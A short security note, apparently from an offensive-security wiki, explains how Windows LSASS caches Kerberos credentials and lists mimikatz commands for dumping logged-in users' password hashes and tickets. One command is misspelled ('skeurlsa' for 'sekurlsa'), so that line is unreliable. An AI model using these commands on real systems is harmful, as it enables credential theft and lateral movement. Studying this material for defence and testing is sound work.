# Cached Credentials

In Kerberos authentication, **Ticket Granting Tickets (TGTs)** have a limited lifespan. To avoid requiring the user to manually re-enter their password every time the TGT needs to be renewed, the **user's credentials** (like their password hash) are temporarily cached on the system. This allows automatic renewal of the TGT without user intervention.

### LSASS Process

**LSASS (Local Security Authority Subsystem Service)**:\
The **LSASS** process is responsible for handling security tokens, enforcing security policies, and managing user logins on a Windows system. It also securely stores **credentials.**

**LSASS** temporarily holds these credentials in memory so that it can automatically renew the TGT when it expires.

User with local administrator permissions is able to dump all logged-in users hashes using [mimikatz](https://github.com/ParrotSec/mimikatz):

```
privilege::debug # verify permissions
skeurlsa::logonpasswords # extracting cached credentials
```

Tickets can also be dumped using the following command

```
sekurlsa::tickets  # extracting cached tickets
```
